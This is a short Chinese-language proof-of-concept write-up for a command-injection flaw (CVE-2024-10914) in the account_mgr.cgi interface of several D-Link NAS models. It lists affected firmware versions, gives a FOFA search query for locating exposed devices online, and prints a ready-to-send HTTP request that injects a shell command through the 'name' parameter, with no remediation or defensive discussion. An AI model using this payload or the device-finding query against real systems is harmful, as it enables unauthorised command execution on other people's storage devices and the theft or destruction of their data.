# D-Link-NAS接口account_mg存在命令执行漏洞(CVE-2024-10914)
D-Link NAS设备 account_mg存在命令执行漏洞

## 影响版本
```java
DNS-320-版本 1.00
DNS-320LW-版本 1.01.0914.2012
DNS-325-版本 1.01和 1.02
DNS-340L-版本 1.08
```

## fofa
```java
app="D_Link-DNS-ShareCenter"
```

![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1731336110353-da817235-136a-49bd-9e02-241d826321d4.png)

## poc
```java
GET /cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27;id;%27 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
```

![](https://cdn.nlark.com/yuque/0/2024/png/29512878/1731336023387-187f8fb1-9ff9-44a2-8e5d-f7ac5d81b3cc.png)

